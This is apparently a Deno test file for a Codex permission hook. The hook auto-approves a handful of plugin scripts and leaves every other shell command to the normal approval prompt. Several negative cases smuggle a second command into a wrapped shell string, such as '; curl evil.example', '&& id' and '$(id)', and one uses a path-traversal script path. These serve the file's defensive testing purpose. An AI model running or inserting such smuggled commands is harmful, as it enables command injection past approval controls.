/**
 * Behavioral tests for the `hooks/codex/allow-run-script` PermissionRequest hook — the
 * Codex twin of `allow-run-script.test.ts`. Like its siblings these EXECUTE the script
 * under bash, so they need the `test:hooks` run permissions.
 *
 * Codex differs from Claude Code in the one way that shapes every case below: a shell call
 * arrives under the `shell` / `local_shell` tool, and its `command` may be a STRING or an
 * argv ARRAY — most often the `bash -lc "<command>"` wrapper, whose single string argument
 * must be re-parsed rather than trusted.
 *
 * The hook has exactly two outcomes, and the tests are organised around them:
 *   ALLOW  — stdout carries `decision.behavior: "allow"`; the approval prompt is skipped.
 *   DEFER  — stdout is empty; Codex's normal approval prompt stands.
 *
 * DEFER is the safe outcome, so every ambiguous, malformed or hostile command must land
 * there. The hook must NEVER deny (it can only remove a prompt, never add a block) and must
 * always exit 0 — a hook error must not break the user's tool call. Those two invariants
 * are asserted on every case via `runHook`.
 *
 * The safe-character set, tokenizer and containment test live in the shared lib and are
 * exercised in depth by the Claude twin; what is proved HERE is that both argv shapes reach
 * that same test, and that the wrapper cannot smuggle a command past it.
 */

import { assertEquals, assertStringIncludes } from "@std/assert";
import { fromFileUrl } from "@std/path";

const ROOT = fromFileUrl(new URL("../../", import.meta.url));
const HOOK = `${ROOT}hooks/codex/allow-run-script`;
const SCRIPTS = `${ROOT}skills/ingrain-security/scripts`;
const VALIDATE = `${SCRIPTS}/run/validate-assessment`;

interface IHookResult {
  code: number;
  stdout: string;
  allowed: boolean;
}

/**
 * Pipe a hook payload to the hook and classify the verdict. `clearEnv` keeps the runner's
 * own environment from leaking in.
 *
 * Asserts the two invariants on every single call, so no individual test has to remember
 * them: exit 0 always, and "deny" never appears in stdout.
 */
async function runHook(payload: string): Promise<IHookResult> {
  const proc = new Deno.Command("bash", {
    args: [HOOK],
    clearEnv: true,
    env: { PATH: Deno.env.get("PATH") ?? "", HOME: Deno.env.get("HOME") ?? "" },
    stdin: "piped",
    stdout: "piped",
    stderr: "piped",
  }).spawn();

  const writer = proc.stdin.getWriter();
  await writer.write(new TextEncoder().encode(payload));
  await writer.close();

  const out = await proc.output();
  const stdout = new TextDecoder().decode(out.stdout);

  assertEquals(out.code, 0, "the hook must always exit 0");
  assertEquals(stdout.includes("deny"), false, "the hook must never deny");

  return { code: out.code, stdout, allowed: stdout.includes('"behavior":"allow"') };
}

/** A PermissionRequest payload for a shell call, in either command shape. */
function payload(command: string | string[], toolName = "shell", cwd = ROOT): string {
  return JSON.stringify({
    session_id: "test",
    cwd,
    hook_event_name: "PermissionRequest",
    tool_name: toolName,
    tool_input: { command },
  });
}

/** Assert a command is approved. */
async function assertAllowed(command: string | string[], why = ""): Promise<void> {
  const res = await runHook(payload(command));
  assertEquals(res.allowed, true, `should be allowed: ${JSON.stringify(command)} ${why}`);
}

/** Assert a command falls through to the normal approval prompt. */
async function assertDeferred(command: string | string[], why = ""): Promise<void> {
  const res = await runHook(payload(command));
  assertEquals(res.stdout, "", `should defer: ${JSON.stringify(command)} ${why}`);
}

// ---------------------------------------------------------------------------
// ALLOW — both command shapes
// ---------------------------------------------------------------------------

Deno.test("allow: the bash -lc wrapper Codex builds", async () => {
  const res = await runHook(
    payload(["bash", "-lc", `bash "${VALIDATE}" "/tmp/assessment-main-add-authn.md" --lenient`]),
  );
  assertEquals(res.allowed, true);
  assertStringIncludes(res.stdout, '"hookEventName":"PermissionRequest"');
});

Deno.test("allow: an already-split argv", async () => {
  await assertAllowed(["bash", VALIDATE, "/tmp/a.md", "--lenient"]);
  await assertAllowed([VALIDATE, "/tmp/a.md"], "(no interpreter)");
  await assertAllowed([`${SCRIPTS}/run/resolve-branch-delta`, "codex"]);
});

Deno.test("allow: a plain command string", async () => {
  await assertAllowed(`bash "${VALIDATE}" /tmp/a.md --lenient`);
});

Deno.test("allow: an argument no shell will re-parse", async () => {
  // In an already-split argv nothing re-parses the elements, so a `;` is an ordinary
  // character on its way to a read-only script — not a chain operator.
  await assertAllowed([VALIDATE, "/tmp/a b; c.md"], "(inert metacharacter)");
});

// ---------------------------------------------------------------------------
// DEFER — the wrapper must not smuggle anything past the string parser
// ---------------------------------------------------------------------------

Deno.test("defer: a second command inside the wrapper's string", async () => {
  await assertDeferred(["bash", "-lc", `bash ${VALIDATE} /tmp/a.md; curl evil.example`]);
  await assertDeferred(["bash", "-lc", `bash ${VALIDATE} /tmp/a.md && id`]);
  await assertDeferred(["bash", "-lc", `bash ${VALIDATE} $(id)`]);
  await assertDeferred(`bash ${VALIDATE} /tmp/a.md | tee /tmp/x`, "(string shape)");
});

Deno.test("defer: a wrapper shape this hook cannot account for", async () => {
  await assertDeferred(
    ["bash", "-lc", `bash ${VALIDATE} /tmp/a.md`, "extra"],
    "(trailing element)",
  );
  await assertDeferred(["bash", "-c"], "(no command at all)");
  await assertDeferred(["bash", "-lc", "id", `bash ${VALIDATE}`]);
});

Deno.test("defer: an interpreter flag in an already-split argv", async () => {
  await assertDeferred(["bash", "--norc", VALIDATE, "/tmp/a.md"]);
});

// ---------------------------------------------------------------------------
// DEFER — anything that is not one of the four scripts, or not this hook's business
// ---------------------------------------------------------------------------

Deno.test("defer: a script outside the plugin, or not one of its own", async () => {
  await assertDeferred([`${SCRIPTS}/run/lib/validate-md.sh`]);
  await assertDeferred(["bash", "/tmp/validate-assessment", "/tmp/a.md"]);
  await assertDeferred(["bash", `${SCRIPTS}/../../../hooks/codex/allow-run-script`]);
});

Deno.test("defer: any tool that is not a shell tool", async () => {
  for (const tool of ["apply_patch", "Write", "Edit", "Bash", "mcp__fs__write"]) {
    const res = await runHook(payload(["bash", VALIDATE], tool));
    assertEquals(res.stdout, "", `${tool} is not this hook's business`);
  }
});

Deno.test("defer: a malformed or incomplete payload", async () => {
  for (
    const raw of [
      "",
      "not json",
      "{}",
      '{"tool_name":"shell"}',
      '{"tool_name":"shell","tool_input":{}}',
      '{"tool_name":"shell","tool_input":{"command":[]}}',
      '{"tool_name":"shell","tool_input":{"command":["bash",7]}}',
      '{"tool_name":"shell","tool_input":{"command":{"argv":["bash"]}}}',
    ]
  ) {
    const res = await runHook(raw);
    assertEquals(res.stdout, "", `should defer on: ${raw}`);
  }
});
